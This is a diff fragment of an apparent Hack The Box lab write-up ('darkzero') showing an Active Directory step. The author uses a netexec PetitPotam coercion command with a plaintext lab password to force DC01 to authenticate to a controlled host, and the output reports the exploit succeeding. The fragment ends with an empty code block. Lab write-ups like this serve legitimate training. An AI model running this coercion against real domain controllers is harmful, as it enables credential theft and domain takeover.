@@ -830,4 +830,18 @@ I now have a SYSTEM beacon
 
 # Domain Admin
 
-So now i am SYSTEM i can technically dump all the kerberos tickets on the system, but first ill need to coerce auth bak
+So now i am SYSTEM i can technically dump all the kerberos tickets on the system, but first ill need to coerce auth back to dc02 since thats what i control
+
+```python
+nxc smb dc01.darkzero.htb -u john.w -p 'RFulUtONCOL!' -M coerce_plus -o METHOD=PetitPotam LISTENER=dc02.darkzero.ext 
+SMB         10.129.48.21    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.48.21    445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
+COERCE_PLUS 10.129.48.21    445    DC01             VULNERABLE, PetitPotam
+COERCE_PLUS 10.129.48.21    445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile
+```
+
+This worked
+
+```python
+
+```
